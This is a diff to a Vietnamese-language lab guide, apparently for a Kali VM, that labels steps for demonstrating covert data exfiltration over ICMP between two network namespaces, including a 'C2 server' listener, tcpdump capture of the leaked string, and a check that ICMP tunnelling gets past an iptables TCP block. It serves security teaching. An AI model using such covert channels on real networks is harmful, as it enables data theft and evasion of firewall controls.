@@ -9,6 +9,11 @@
   - `h1`: `10.0.0.1/24` (Client nội bộ / Kẻ tuồn dữ liệu) trên `veth1`
   - `h2`: `10.0.0.2/24` (Server ngoài / C2 Server) trên `veth2`
 
+> 💡 **Quy ước thực thi lệnh:**
+> - `[CLIENT - h1]`: Lệnh chạy trong namespace client tuồn dữ liệu (tiền tố `ip netns exec h1`).
+> - `[SERVER C2 - h2]`: Lệnh chạy trong namespace máy chủ C2 nhận dữ liệu (tiền tố `ip netns exec h2`).
+> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.
+
 ---
 
 ### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT
@@ -114,6 +119,7 @@ EOF
 ### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG
 
 ```bash
+# [HOST / CHUNG] Thiết lập topology h1 <-> h2
 sudo bash /tmp/lab03/setup_pair.sh
 ```
 
@@ -121,18 +127,18 @@ sudo bash /tmp/lab03/setup_pair.sh
 
 ### 4. BƯỚC 3: KHỞI CHẠY KÊNH TRUYỀN NGẦM ICMP
 
-1. Khởi chạy Server trong background trên `h2`:
+1. **[SERVER C2 - h2]** Khởi chạy Server trong background trên `h2`:
    ```bash
    sudo ip netns exec h2 python3 /tmp/lab03/icmp_server.py > /tmp/lab03/server.log 2>&1 &
    SERVER_PID=$!
    sleep 1
    ```
-2. Mở `tcpdump` trên `h2` với cờ `-A` để bắt và đọc rõ payload ASCII:
+2. **[SERVER C2 - h2]** Mở `tcpdump` trên `h2` với cờ `-A` để bắt và đọc rõ payload ASCII:
    ```bash
    sudo ip netns exec h2 tcpdump -i veth2 -nn -A icmp > /tmp/lab03/tcpdump_payload.log 2>&1 &
    sleep 1
    ```
-3. Chạy Client trên `h1` để tuồn chuỗi dữ liệu `tainbow`:
+3. **[CLIENT - h1]** Chạy Client trên `h1` để tuồn chuỗi dữ liệu `tainbow`:
    ```bash
    sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
    sleep 2
@@ -142,13 +148,18 @@ sudo bash /tmp/lab03/setup_pair.sh
 
 ### 5. BƯỚC 4: KIỂM CHỨNG KẾT QUẢ DỮ LIỆU TUỒN
 
-1. Xem nhật ký Server:
+1. **[SERVER C2 - h2]** Xem nhật ký Server:
    ```bash
    cat /tmp/lab03/server.log
    ```
    *Kỳ vọng:* Hiển thị `[+] Nhận dữ liệu ngầm từ 10.0.0.1: b'tainbow'`.
 
-2. Xem log bắt gói `tcpdump` đọc rõ cleartext ASCII:
+2. **[HOST / CHUNG]** Tắt tiến trình Scapy Server:
+   ```bash
+   sudo kill $SERVER_PID 2>/dev/null || sudo pkill -f icmp_server.py 2>/dev/null || true
+   ```
+
+3. **[SERVER C2 - h2]** Xem log bắt gói `tcpdump` đọc rõ cleartext ASCII:
    ```bash
    cat /tmp/lab03/tcpdump_payload.log
    ```
@@ -158,17 +169,17 @@ sudo bash /tmp/lab03/setup_pair.sh
 
 ### 6. BƯỚC 5: KIỂM CHỨNG VƯỢT TƯỜNG LỬA TẦNG 4 (FIREWALL EVASION)
 
-1. Thiết lập luật iptables trên `h2` chặn toàn bộ lưu lượng TCP:
+1. **[SERVER C2 - h2]** Thiết lập luật iptables trên `h2` chặn toàn bộ lưu lượng TCP:
    ```bash
    sudo ip netns exec h2 iptables -A INPUT -p tcp -j DROP
    ```
-2. Kiểm tra kết nối TCP thông thường bằng `nc`:
+2. **[CLIENT - h1]** Kiểm tra kết nối TCP thông thường bằng `nc`:
    ```bash
-   sudo ip netns exec h1 nc -zvw 2 10.0.0.2 80 || echo "[+] TCP bị chặn đúng như kỳ vọng!"
+   sudo ip netns exec h1 nc -zvw 2 10.0.0.2 80
    ```
    *Kỳ vọng:* Kết nối TCP bị timeout (mã thoát 1).
 
-3. Kiểm tra lại kênh truyền ngầm ICMP:
+3. **[CLIENT - h1]** Kiểm tra lại kênh truyền ngầm ICMP:
    ```bash
    sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
    ```
@@ -179,6 +190,7 @@ sudo bash /tmp/lab03/setup_pair.sh
 ### 7. BƯỚC 6: DỌN DẸP MÔI TRƯỜNG
 
 ```bash
+# [HOST / CHUNG] Tắt tiến trình nền và xóa namespaces
 sudo pkill -f icmp_server.py 2>/dev/null || true
 sudo pkill -f tcpdump 2>/dev/null || true
 sudo ip netns exec h2 iptables -F 2>/dev/null || true
